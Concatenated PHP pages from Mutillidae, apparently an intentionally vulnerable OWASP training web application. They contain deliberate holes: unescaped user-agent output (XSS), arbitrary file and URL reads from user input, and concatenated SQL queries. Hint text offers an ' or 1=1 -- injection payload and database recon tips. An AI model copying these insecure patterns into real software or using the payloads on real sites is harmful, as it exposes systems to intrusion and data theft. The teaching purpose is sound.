    } catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $query);
    }// end try;
?>

<div class="page-title">Browser Version Site Footer</div>

<?php include_once './includes/back-button.inc';?>

<table style="margin-left:auto; margin-right:auto;">
	<tr>
		<td colspan="2" class="form-header">Browser Version</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td class="label">Browser Version: </td>
		<td><?php echo $lClientUserAgentString; ?></td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td colspan="2" style="text-align:center;" class="label">
			Notice the browser version (shown above) being displayed in the site footer on every page. 
		</td>
	</tr>
	<tr>
		<td colspan="2" style="text-align:center;" class="label">
			What could possibly go wrong? 
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
							<li>Any time dynamic output is displayed by the browser, think "Cross-Site Scripting". 
							Work backwards from that output to see if there is a way to influence 
							what is output. This could be as simple as entering "123" in the first field, 
							"456" in the second field, and so on. Repeat this for all input including HTTP 
							Headers, Cookie values, Hidden Fields etc. If those inputs show up anywhere in the output 
							investigate further. Dont look for visible output. That will miss most of the output. 
							Search the entire response stream including all the HTTP Headers. If you find 
							your test strings, send in more useful characters such as "&lt;". 
							Some developers sanitize input which may later be output. 
							Others encode (escape) the input. These are nice tries but can result in
							"FAIL" because the data could be changed after it is input encoded by
							someone with access to the database, a database corrupting script, or 
							any attempts to filter/sanitize can be flawed/bypassed. To defend against
							Cross-Site Scripting, encode all output per context.</li>
							<li>Any time the application uses the HTTP headers there are multiple 
							possibilities. If the HTTP header is output into the page, think XSS. 
							Output is output
							after all. Any data output by the application which can be influenced by 
							the user is fair game for XSS. But with HTTP Headers, also consider 
							HTTP Response Splitting. HTTP Headers are delimited (separated) by line-breaks. 
							Check out the RFC on HTTP to see the specification. 
							When an application included some type of input
							as output into the HTTP Header, it may be possible to inject a line-break.
							If this is possible, then an actor could also inject a new HTTP Header of 
							there choosing. These two situations are counterparts. XSS via HTTP Headers 
							may occur when HTTP Request Headers are output into the HTTP Response. 
							HTTP Response Splitting may occur when user/database input is output into 
							HTTP Headers. </li>
							<li>Just because the application sanitized/validated/filtered the input 
							when the user sent the input doesnt mean the application is safe. The 
							database could be altered by a rouge insider, a database attack such as 
							ASPROX, or a mallicious programmer. Developers should not have access to 
							production database data; ever. Developers should not be able to copy 
							their own code into production; ever. That is what change control is for.</li>
						  	<li>All information coming to the server in HTTP requests is under the 
							  	complete control of the user. This includes any information normally 
							  	being thought of as "sent by the browser". HTTP requests are simply
	  			 				streams of strings formatting according to HTTP specifications. Anyone 
	  			 				can format an HTTP string properly. A browser is not required. 
	  			 				Try reading the RFC for HTTP to see how to construct the strings.
				  			</li>
				  			<li>The HTTP header beign displayed here is the user-agent also know as the 
					  			browser. Check out user-agent switchers like the add-on for Firefox to 
					  			change only the user-agent string without  
					  			having to create the entire header.
				  			</li>
				  			<li>Try Tamper Data to get control of all the HTTP headers in the request. 
				  			You can start by changing the user-agent to see your input displayed here.</li>
				  			<li>Try netcat to create your own HTTP header from scratch.</li>
				  			<li>When you get really comfortable. Try sending HTTP requests via Telnet.</li>
				  			<li>Sites become vulnerable to HTTP header injection when they output the HTTP headers
				  			into the page without output encoding per context first.
				  			</li>
				  			<li>
				  				This code may not be secure secure because we may or may not escape  
				  				all output according to context. This browser information is being 
				  				output to HTML so we should HTML encode the information. If we 
				  				were outputing into JavaScript we would not use HTML encoding. We would use 
				  				JavaScript string encoding. There are 5 contexts to be particuarly careful 
				  				about. HTML, HTML attributes, JavaScript, CSS, and URL query parameters.
				  			</li>
				  		</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
?>
<?php 
	 /* Known Vulnerabilities
	 * 
	 * Page itself is a vulnerability which shows source code. Very bad idea.
	 * Filename injection (Insecure Direct Object Reference)
	 * SQL Injection, (Fix: Use Schematized Stored Procedures)
	 * Cross Site Scripting, (Fix: Encode all output)
	 * Cross Site Request Forgery, (Fix: Tokenize transactions)
	 * Insecure Direct Object Reference, (Fix: Tokenize Object References)
	 * Denial of Service, (Fix: Truncate Log Queries)
	 * Loading of Local Files, (Fix: Tokenize Object Reference - Filename references in this case)
	 * Improper Error Handling, (Fix: Employ custom error handler)
	 * SQL Exception, (Fix: Employ custom error handler)
	 * HTTP Parameter Pollution (Fix: Scope request variables)
	 */
	try {	    	
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure 
				$lBeSmart = FALSE;
	   		break;
	    		
			case "2":
			case "3":
			case "4":
	   		case "5": // This code is fairly secure
				$lBeSmart = TRUE;
	   		break;
	   	}// end switch ($_SESSION["security-level"])
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error in text file viewer. Cannot load file.");
	}// end try
	
	//initialize custom error handler
    require_once 'classes/DirectoryIterationHandler.php';
	if (!isset($DirectoryIterationHandler)){
		$DirectoryIterator = new DirectoryIterationHandler(".");
	}// end if
?>

<div class="page-title">Source Code Viewer</div>

<?php include_once './includes/back-button.inc';?>

<form 	action="index.php?page=source-viewer.php" 
		method="post" 
		enctype="application/x-www-form-urlencoded">
		
	<table style="margin-left:auto; margin-right:auto;">
		<tr id="id-bad-cred-tr" style="display: none;">
			<td colspan="2" class="error-message">
				Validation Error: Bad Selection
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" class="form-header">To see the source of the file, choose and click "View File".<br />Note that not all files are listed.</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Source File Name</td>
			<td>
				<input type="hidden" name="page" value="<?php echo $_REQUEST['page']?>">
				<?php 
					if($lBeSmart){
						// CSRF Defense
					    require_once 'classes/CSRFTokenStructure.php';
						$lCSRFTokenStructure = new CSRFTokenStructure($_SERVER['PHP_SELF'], $_SESSION['logged_in_user']);
						$_SESSION['source-viewer-csrf-token'] = $lCSRFTokenStructure;						
						echo '<input type="hidden" name="CSRFToken" value="'.$lCSRFTokenStructure->getCSRFToken().'"/>';
					}//end if
				?>
				<select name="phpfile" id="id_file_select">
				<?php 
					$_SESSION['source-viewer-files-array'] = "";						
					if(!$lBeSmart){
						// Just print raw filenames as values
						foreach ($DirectoryIterator as $fileInfo) {
							$lPHPFileName = $fileInfo->getFilename();
							if ($fileInfo->GetExtension() == "php" and !$fileInfo->isDot() and ($lPHPFileName != "set-up-database.php")) {
						   		echo '<option value="' . $lPHPFileName . '">' . $lPHPFileName . "</option>";
							}// end if
						}// end for each
					}else{
						// Tokenization Defense
						$aAllowedPHPFiles = array();
						$lCounter = 0;
						foreach ($DirectoryIterator as $fileInfo) {
							$lPHPFileName = $fileInfo->getFilename();
							if ($fileInfo->GetExtension() == "php" and !$fileInfo->isDot() and ($lPHPFileName != "set-up-database.php")) {
						   		echo '<option value="' . $lCounter . '">' . $lPHPFileName . "</option>";
								$aAllowedPHPFiles[$lCounter]=$lPHPFileName;
								$lCounter += 1;							
							}// end if
						}// end for each
						$_SESSION['source-viewer-files-array'] = $aAllowedPHPFiles;
					}// end if
				?>
				</select>
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input name="source-file-viewer-php-submit-button" class="button" type="submit" value="View File" />
			</td>
		</tr>
		<tr><td></td></tr>
	</table>
</form>

<?php
	try {	    	
		if (isset($_POST['source-file-viewer-php-submit-button'])){

			if (!$lBeSmart) {
	   			/* This code is insecure. Direct object references in the form of the "file"
	   			 parameter give the user complete control of the input. Contrary to popular belief, 
	   			 input validation, blacklisting, etc is not the best defense. The best defenses are 
	   			 provably secure 100% of the time. For direct object references, there are two defenses.
	   			 Authorization via ACL or Entitlements is used when transaction requires authentication.
	   			 This transaction (forwarding URL) does not require authentication so the other method is used;
	   			 mapping. Mapping substitutes a harmless token for the direct object. The direct object in 
	   			 this case is the page the user is being forwarded to. We will use mapping to secure this code.
	   			 
	   			 Note: Some sites try to use validation to defend against Insecure Direct Object References.
	   			 Validation fails in many cases due to weak validators.
	   			
	   			 Note: For static links, the best defense is to simply hardcode the links in an anchor tag.
	   			 This exercise will use mapping to show how it works, but it should be recognized that 
	   			 for giving the user links to click, hardcoding is the best defense.
	   			*/
	   			
	   			/* insecure: $_REQUEST would take input from GET or POST. This can result in an HTTP Parameter Polution
	   			 * attack. If a site uses POST, then grab input from _POST. Use _GET for gets. HPP can
	   			 * occur more easily when input is ambiguous.
	   			 * 
	   			 * Also, the web is weakly typed. All data is strings. It doesnt matter what the developers
	   			 * thinks the input is (int, string, char, etc.). The fact is that HTTP is text. if the 
	   			 * "phpfile" is expected to be integer, it should be validated as such. If string, then 
	   			 * validate as string.
	   			 * 
	   			 *  Definition of validation. Perform all of:
	   			 *  
	   			 *  check data type
	   			 *  check data length
	   			 *  check character set
	   			 *  check pattern
	   			 *  check range
	   			 */

				// CSRF Defense
			    //NOT YET IMPLEMENTED
			    // Check that the token for this page and this request matches
			    //Token good for one request from one page only
				
				// Grab inputs
				$pPHPFile = $_REQUEST['phpfile'];
				
				// Insecure Mode: Skip validation
				$lFilename = $pPHPFile;

				$LogHandler->writeToLog($conn, "Page source-viewer.php loaded file: " . $lFilename);

			}elseif ($lBeSmart){
	   			/* The "phpfile" is expected to be integer, so validate as such. Also,
	   			 * dont use _REQUEST as this would allow a POSTed "phpfile" to be sent 
	   			 * along with a URL query parameter "phpfile" as well. This type of sloppy
	   			 * variable fetching can result in HTTP Parameter Pollution. 
	   			 */
	   			$pPHPFile=$_POST["phpfile"];
	   			$laAllowedPHPFiles = $_SESSION['source-viewer-files-array'];
	   			$lArrayCount = count($laAllowedPHPFiles);
	   			
	   			if (!is_array($laAllowedPHPFiles)){
	   				throw new Exception('Validation Failed: Did not receive allowed values array.');
	   			}// end if

	   			if (!($lArrayCount > 0)){
	   				throw new Exception('Validation Failed: Array is empty.');
	   			}// end if
	   			
	   			/* We expect small int. validate positive integer between 0-9.
	   			 * Regex pattern makes sure the user doesnt send in characters that
	   			 * are not actually digits but can be cast to digits.
	   			 */	
	   			$isDigits = (preg_match("/\d{1,4}/", $pPHPFile) == 1);    			
	   			if (!($isDigits && $pPHPFile >= 0 && $pPHPFile < $lArrayCount)){
	   				throw(new Exception("Expected integer input. Cannot process request. Support team alerted."));
	   			}// end if

	   			/* Insecure Direct Object References are patched
				 * by removing the direct object reference all together.
				 * Web applications are "fronts" for services. Some web
				 * sites offer web pages, some offer XML, SOAP, or other
				 * services. In any case, the web site should not "give away"
				 * information about internal objects such as database IDs,
				 * redirection URLs, system file names, or application
				 * paths/configuration.
				 * 
				 * Offer the user harmless tokens instead of actual 
				 * objects. In this case, we use integers to map to
				 * the direct object, which is the forwarding URL.
				 */ 
				$lFilename = $laAllowedPHPFiles[$pPHPFile];

				$LogHandler->writeToLog($conn, "Page source-viewer.php loaded file: " . $lFilename);				
		   	}// end if $lBeSmart

		   	// try to display the file
		   	try {
	   			echo '<p class="label">File: '.$lFilename.'</p>';
	   			echo '<pre>';
				highlight_file($lFilename);
				echo '</pre>';
			}catch(Exception $e){
				echo $CustomErrorHandler->FormatError($e, "Error trying to print file. Cannot load file.");
			}// end try
					   	
		}// end if (isset($_POST['source-file-viewer-php-submit-button']))
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error in source file viewer. Cannot load file.");
	}// end try
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For Malicious File Execution/Insecure Direct Object Reference:</b>
									So, this script shows the source of most of the php files in this site, but not 
									all. Giving even this level of information about the application is a bad idea.
									What would be another good script to checkout? A script that you see in the 
									menu list on the left, but not the dropdown box? Using GET instead of POST
									makes this one easier to abuse, but with "Tamper Data" or "Paros" you could
									still screw with POST data.
							</li>
						  	<li>I wonder what the traffic generated by this page looks like? Wireshark is a good tool to examine network traffic.</li>
							<li>Some code contains naive protections such as limiting the width of HTML fields. 
								If your If you find that you need more room, try using a tool like Firebug to 
								change the size of the field to be as long as you like. As you advance, 
								try using tools like netcat to make your own POST requests without having 
								to use the login web page at all.
							</li>
							<li>You can use a page normally but then simply change the parameters is Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>So if this page is grabbing files, loading them, then displaying there contents, is it possible to use this page to grab any HTML file from any site?</li>
							<li>There is nothing special about HTML files except their format. 
							Functions that load files usually do not care about the files contents. 
							(An exception might be .NET Framework\'s MSXML.loadfile() which is simply a 
							shortcut function to both load and parse XML in one call.) If the loader doesn\'t 
							care what it loads, could this page be used to load any arbitrary file? Do the 
							files have to be PHP source files or could they be any local file?</li> 
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	// End hints section
?>
<?php 
	/* Known Vulnerabilities
	 * SQL Injection, (Fix: Use Schematized Stored Procedures)
	 * Cross Site Scripting, (Fix: Encode all output)
	 * Cross Site Request Forgery, (Fix: Tokenize transactions)
	 * Insecure Direct Object Reference, (Fix: Tokenize Object References)
	 * Denial of Service, (Fix: Truncate Log Queries)
	 * Loading of Local Files, (Fix: Tokenize Object Reference - Filename references in this case)
	 * Improper Error Handling, (Fix: Employ custom error handler)
	 * SQL Exception, (Fix: Employ custom error handler)
	 * HTTP Parameter Pollution (Fix: Scope request variables)
	 */
	try {	    	
		switch ($_SESSION["security-level"]){
   			case "0": // This code is insecure
   			case "1": // This code is insecure
				$lUseTokenization = FALSE;
	   		break;
	    		
			case "2":
			case "3":
			case "4":
	   		case "5": // This code is fairly secure
				$lUseTokenization = TRUE;
	   		break;
	   	}// end switch ($_SESSION["security-level"])
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error in text file viewer. Cannot load file.");
	}// end try
?>

<div class="page-title">Hacker Files of Old</div>

<?php include_once './includes/back-button.inc';?>

<form 	action="index.php?page=text-file-viewer.php" 
		method="post" 
		enctype="application/x-www-form-urlencoded">
		
	<table style="margin-left:auto; margin-right:auto;">
		<tr id="id-bad-cred-tr" style="display: none;">
			<td colspan="2" class="error-message">
				Validation Error: Bad Selection
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" class="form-header">Take the time to read some of these great old school hacker text files.<br />Just choose one form the list and submit.</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Text File Name</td>
			<td>
				<select size="1" name="textfile" id="id_textfile_select">
					<option value="<?php if ($lUseTokenization){echo 1;}else{echo 'http://www.textfiles.com/hacking/auditool.txt';}?>">Intrusion Detection in Computers by Victor H. Marshall (January 29, 1991)</option>
					<option value="<?php if ($lUseTokenization){echo 2;}else{echo 'http://www.textfiles.com/hacking/atms';}?>">An Overview of ATMs and Information on the Encoding System</option>
					<option value="<?php if ($lUseTokenization){echo 3;}else{echo 'http://www.textfiles.com/hacking/backdoor.txt';}?>">How to Hold Onto UNIX Root Once You Have It</option>
					<option value="<?php if ($lUseTokenization){echo 4;}else{echo 'http://www.textfiles.com/hacking/hack1.hac';}?>">The Basics of Hacking, by the Knights of Shadow (Intro)</option>
					<option value="<?php if ($lUseTokenization){echo 5;}else{echo 'http://www.textfiles.com/hacking/hacking101.hac';}?>">HACKING 101 - By Johnny Rotten - Course #1 - Hacking, Telenet, Life</option>
				</select>
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input name="text-file-viewer-php-submit-button" class="button" type="submit" value="View File" />
			</td>
		</tr>
		<tr><td></td></tr>
		<tr><td class="label" colspan="2">For other great old school hacking texts, check out <a href="http://www.textfiles.com/">http://www.textfiles.com/</a>.</td></tr>
	</table>
</form>

<?php
	try {	    	
		if (isset($_POST['text-file-viewer-php-submit-button'])){

			if (!$lUseTokenization) {
		   			/* This code is insecure. Direct object references in the form of the "textfile"
		   			 parameter give the user complete control of the input. Contrary to popular belief, 
		   			 input validation, blacklisting, etc is not the best defense. The best defenses are 
		   			 provably secure 100% of the time. For direct object references, there are two defenses.
		   			 Authorization via ACL or Entitlements is used when transaction requires authentication.
		   			 This transaction (forwarding URL) does not require authentication so the other method is used;
		   			 mapping. Mapping substitutes a harmless token for the direct object. The direct object in 
		   			 this case is the page the user is being forwarded to. We will use mapping to secure this code.
		   			 
		   			 Note: Some sites try to use validation to defend against Insecure Direct Object References.
		   			 Validation fails in many cases due to weak validators.
		   			
		   			 Note: For static links, the best defense is to simply hardcode the links in an anchor tag.
		   			 This exercise will use mapping to show how it works, but it should be recognized that 
		   			 for giving the user links to click, hardcoding is the best defense.
		   			*/
		   			
		   			/* insecure: $_REQUEST would take input from GET or POST. This can result in an HTTP Parameter Polution
		   			 * attack. If a site uses POST, then grab input from _POST. Use _GET for gets. HPP can
		   			 * occur more easily when input is ambiguous.
		   			 * 
		   			 * Also, the web is weakly typed. All data is strings. It doesnt matter what the developers
		   			 * thinks the input is (int, string, char, etc.). The fact is that HTTP is text. if the 
		   			 * "textfile" is expected to be integer, it should be validated as such. If string, then 
		   			 * validate as string.
		   			 * 
		   			 *  Definition of validation. Perform all of:
		   			 *  
		   			 *  check data type
		   			 *  check data length
		   			 *  check character set
		   			 *  check pattern
		   			 *  check range
		   			 */
					$pTextFile = $_REQUEST['textfile'];
		   			if ($pTextFile <>"") {
		   				$handle = fopen($pTextFile, "r");
		   				echo '<p class="label">File: '.$pTextFile.'</p>';
		   				echo '<pre>';
		   				echo stream_get_contents($handle);
						echo '</pre>';
						fclose($handle);
					}// end if

		   			$LogHandler->writeToLog($conn, "Displayed contents of URL: " . $pTextFile);

			}elseif ($lUseTokenization){
		   			/* The "textfile" is expected to be integer, so validate as such. Also,
		   			 * dont use _REQUEST as this would allow a POSTed "textfile" to be sent 
		   			 * along with a URL query parameter "textfile" as well. This type of sloppy
		   			 * variable fetching can result in HTTP Parameter Pollution. 
		   			 */
		   			$pTextFile=$_POST["textfile"];
		
		   			/* We expect small int. validate positive integer between 0-9.
		   			 * Regex pattern makes sure the user doesnt send in characters that
		   			 * are not actually digits but can be cast to digits.
		   			 */	
		   			$isDigits = (preg_match("/\d{1,2}/", $pTextFile) == 1);    			
		   			if ($isDigits && $pTextFile > 0 && $pTextFile < 11){
						$lURL = "";
						/* Insecure Direct Object References are patched
						 * by removing the direct object reference all together.
						 * Web applications are "fronts" for services. Some web
						 * sites offer web pages, some offer XML, SOAP, or other
						 * services. In any case, the web site should not "give away"
						 * information about internal objects such as database IDs,
						 * redirection URLs, system file names, or application
						 * paths/configuration.
						 * 
						 * Offer the user harmless tokens instead of actual 
						 * objects. In this case, we use integers to map to
						 * the direct object, which is the forwarding URL.
						 */ 
		   				switch($pTextFile){
		   					case 1: $lURL = "http://www.textfiles.com/hacking/auditool.txt";break;
		   					case 2: $lURL = "http://www.textfiles.com/hacking/atms";break;
		   					case 3: $lURL = "http://www.textfiles.com/hacking/backdoor.txt";break;
		   					case 4: $lURL = "http://www.textfiles.com/hacking/hack1.hac";break;
		   					case 5: $lURL = "http://www.textfiles.com/hacking/hacking101.hac";break;
		   				}// end switch($pTextFile)

		   				$LogHandler->writeToLog($conn, "Displayed contents of URL: " . $lURL);
		   			
						try{
						    // open file handle
			   				$handle = fopen($lURL, "r");
			   				echo '<p class="label">File: '.$lURL.'</p>';
			   				echo '<pre>';
			   				echo stream_get_contents($handle);
							echo '</pre>';
							fclose($handle);
						}catch(Exception $e){
							echo $CustomErrorHandler->FormatError($e, "Error opening file stream. Cannot load file.");
						}// end try					    
		   			}else{
		   				throw(new Exception("Expected integer input. Cannot process request. Support team alerted."));
		   			}// end if
		   	}// end if $lUseTokenization
		   	
		}// end if (isset($_POST['text-file-viewer-php-submit-button']))
	}catch(Exception $e){
		echo $CustomErrorHandler->FormatError($e, "Error in text file viewer. Cannot load file.");
	}// end try
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For Malicious File Execution/Insecure Direct Object Reference:</b>
								Hum, looks like I\'m grabbing files from another site. Could we use this as 
								a proxy? Tip: Try the Tamper Data FireFox plugin or maybe Paros Proxy.
							</li>
						  	<li>I wonder what the traffic generated by this page looks like? Wireshark is a good tool to examine network traffic.</li>
							<li>Some code contains naive protections such as limiting the width of HTML fields. 
								If your If you find that you need more room, try using a tool like Firebug to 
								change the size of the field to be as long as you like. As you advance, 
								try using tools like netcat to make your own POST requests without having 
								to use the login web page at all.
							</li>
							<li>You can use a page normally but then simply change the parameters is Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>So if this page is grabbing files, loading them, then displaying there contents, is it possible to use this page to grab any HTML file from any site?</li>
							<li>There is nothing special about HTML files except their format. 
							Functions that load files usually do not care about the files contents. 
							(An exception might be .NET Framework\'s MSXML.loadfile() which is simply a 
							shortcut function to both load and parse XML in one call.) If the loader doesn\'t 
							care what it loads, could this page be used to load any arbitrary file? Do the 
							files have to be remote or could they be local?</li> 
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	// End hints section

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><div class="page-title">Usage Instructions</div>

<?php include_once './includes/back-button.inc';?>

<span>
	Mutillidae implements the <a href="http://www.owasp.org/index.php/OWASP_Top_Ten_Project" target="_blank">OWASP Top 10</a> in PHP.
	<br/><br/>
	Go to the <a href="http://www.owasp.org/index.php/OWASP_Top_Ten_Project" target="_blank">OWASP Top 10</a> page to read about a vulnerability, then choose it from 
	the list on the left to try it out. Hints may help.
	<br/><br/>
	Mutillidae currently has two modes: secure and insecure (default). In insecure mode, the 
	project works like Mutillidae 1.0. Pages are vulnerable to at least the topic they 
	fall under in the menu. Most pages are vulnerable to much more. In secure mode, 
	Mutillidae attempts to protect the pages with server side scripts. Also, hints are disabled in
	secure mode. In the interest of makign as many challenges as possible, this can be defeated. 
	<br/><br/>
	In Mutillidae 2.0, the code has been commented to allow the user to see how the defense works.
	To get the most out of the project, avoid reading the source code until after learning how
	to exploit it. But if you get stuck, the comments should help. Learning how the attack
	works should help to understand the defense.
</span>
<?php 
	try {	    	
    	switch ($_SESSION["security-level"]){
    		case "0": // This code is insecure
    		case "1": // This code is insecure
    			$lFormMethod = "GET";
				$lUserInfoSubmitButton = $_REQUEST["user-info-php-submit-button"];
    		break;
	    		
			case "2":
			case "3":
			case "4":
    		case "5": // This code is fairly secure
    			$lFormMethod = "POST";
    			$lUserInfoSubmitButton = $_POST["user-info-php-submit-button"];
    		break;
    	}//end switch
   	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $lQuery);
   	}// end try;
?>

<div class="page-title">View your details</div>

<?php include_once './includes/back-button.inc';?>

<form 	action="./index.php?page=user-info.php"
		method="<?php echo $lFormMethod; ?>" 
		enctype="application/x-www-form-urlencoded" >
	<input type="hidden" name="page" value="user-info.php" />	
	<table style="margin-left:auto; margin-right:auto;">
		<tr id="id-bad-cred-tr" style="display: none;">
			<td colspan="2" class="error-message">
				Authentication Error: Bad user name or password
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" class="form-header">Please enter username and password<br/> to view account details</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Name</td>
			<td><input type="text" name="username" size="20"></td>
		</tr>
		<tr>
			<td class="label">Password</td>
			<td><input type="password" name="password" size="20"></td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input name="user-info-php-submit-button" class="button" type="submit" value="View Account Details" />
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center; font-style: italic;">
				Dont have an account? <a href="?page=register.php">Please register here</a>
			</td>
		</tr>
	</table>	
</form>

<?php
	if (isset($lUserInfoSubmitButton) && !empty($lUserInfoSubmitButton)){

		try {	    	
		
	    	switch ($_SESSION["security-level"]){
	    		case "0": // This code is insecure
	    		case "1": // This code is insecure
	    			//Accept data from either GET or POST to make this target soft for SQLMAP
					$lUsername = $_REQUEST["username"];
					$lPassword = $_REQUEST["password"];
			
					$LogHandler->writeToLog($conn, "Recieved request to display user information for: " . $lUsername);
	    			
	    			$lQuery  = "SELECT * FROM accounts WHERE username='". 
	    			$lUsername .
	    			"' AND password='" . 
	    			$lPassword . 
	    			"'";
					$lEncodeOutput = FALSE;
	    		break;
	    		
				case "2":
				case "3":
				case "4":
	    		case "5": // This code is fairly secure
	    			/* 
	    			 * Note: While escaping works ok in some case, it is not the best defense.
	    			 * Using stored procedures is a much stronger defense.
	    			 */ 
					$lUsername = $_POST["username"];
					$lPassword = $_POST["password"];
			
					$LogHandler->writeToLog($conn, "Recieved request to display user information for: " . $lUsername);
	    			
					$lQuery  = "SELECT * FROM accounts WHERE username='".
	    			$conn->real_escape_string($lUsername).
	    			"' AND password='".
	    			$conn->real_escape_string($lPassword).
	    			 "'";

		  			/* 
		  			 * NOTE: Input validation is excellent but not enough. The output must be
		  			 * encoded per context. For example, if output is placed in HTML,
		  			 * then HTML encode it. Blacklisting is a losing proposition. You 
		  			 * cannot blacklist everything. The business requirements will usually
		  			 * require allowing dangerous charaters. In the example here, we can 
		  			 * validate username but we have to allow special characters in passwords
		  			 * least we force weak passwords. We cannot validate the signature hardly 
		  			 * at all. The business requirements for text fields will demand most
		  			 * characters. Output encoding is the answer. Validate what you can, encode it
		  			 * all.
		  			 */
		   			// encode the output following OWASP standards
		   			// this will be HTML encoding because we are outputting data into HTML
	    			$lEncodeOutput = TRUE;
	    		break;
	    	}// end switch

    		$result = $conn->query($lQuery);
			if (!$result) {
		    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
		    }// end if
    		
			if ($result->num_rows > 0) {
				echo '<p class="report-header">Results for '.$row->username.'. '.$result->num_rows.' records found.<p>';
			    while($row = $result->fetch_object()){
				
					$LogHandler->writeToLog($conn, "Displayed user-information for: " . $row->username);				
					
					if(!$lEncodeOutput){
						$lUsername = $row->username;
						$lPassword = $row->password;
						$lSignature = $row->mysignature;
					}else{
						$lUsername = $Encoder->encodeForHTML($row->username);
						$lPassword = $Encoder->encodeForHTML($row->password);
						$lSignature = $Encoder->encodeForHTML($row->mysignature);			
					}// end if
					
					echo "<b>Username=</b>{$lUsername}<br>";
					echo "<b>Password=</b>{$lPassword}<br>";
					echo "<b>Signature=</b>{$lSignature}<br><p>";
				}// end while
				echo "<p>";
			} else {
				echo '<script>document.getElementById("id-bad-cred-tr").style.display=""</script>';
			}// end if ($result->num_rows > 0)
				
    	} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, $lQuery);
       	}// end try;
    	
	}// end if (isset($_POST)) 
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For SSL Injection:</b>The old "\' or 1=1 -- " is a classic, but there are others. Check out who 
								you are logged in as after you do the injection.
							</li>
						  	<li><b>For Session and Authentication:</b>As for playing with sessions, try a 
								<a href="https://addons.mozilla.org/en-US/firefox/addon/4510">cookie editor</a> 
								to change your UID.
							</li>
							<li><b>For Insecure Authentication:</b>Try sniffing the traffic with Wireshark, Cain, Dsniff or Ettercap.</li>
							<li>Some code contains naive protections such as limiting the width of HTML fields. 
								If your If you find that you need more room, try using a tool like Firebug to 
								change the size of the field to be as long as you like. As you advance, 
								try using tools like netcat to make your own POST requests without having 
								to use the login web page at all.
							</li>
							<li>You can use the login page normally but then simply change the parameters with Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>
							Try SQL injection probing by entering single-quotes, double-quotes, 
							paranthesis, double-dash (--), hyphen-asterik (/*), and 
							closing-parenthesis-hyphen-hyphen ()--)
							</li>
							<li>The first step is not gaining access but recon. Gaining access is actually fairly late
							in the process. To do recon with respect to SQL injection, try to cause errors to see how the 
							application reacts. Some applications (many actually) fail to install custom error pages
							as required. Try to find out what database is running then inject special characters for that database. 
							After special characters, try fuzzing major characters sets. Finally, if the application
							still has not produced useful error messages, then try timing attacks. Your goal is to get a
							reaction. Well built sites wont act differently even when a database error occurs.
							</li>
							<li>After performing error recon and blind timing attacks, an entry point may be found to begin
							data extraction. Initially the best data to extract is data about the database itself. Try to 
							answer the questions of what tables, views, columns, functions, procedures, system procedures,
							and other objects exist.
							
							From the MySQL reference documentation: Metadata is data about the data, such as the name of a database or table, the data type of a column, or access privileges. Other terms that sometimes are used for this information are data dictionary and system catalog.
							INFORMATION_SCHEMA is the information database, the place that stores information about all the other databases that the MySQL server maintains. Inside INFORMATION_SCHEMA there are several read-only tables. They are actually views, not base tables, so there are no files associated with them.
							In effect, we have a database named INFORMATION_SCHEMA, although the server does not create a database directory with that name. It is possible to select INFORMATION_SCHEMA as the default database with a USE statement, but it is possible only to read the contents of tables. You cannot insert into them, update them, or delete from them.
							
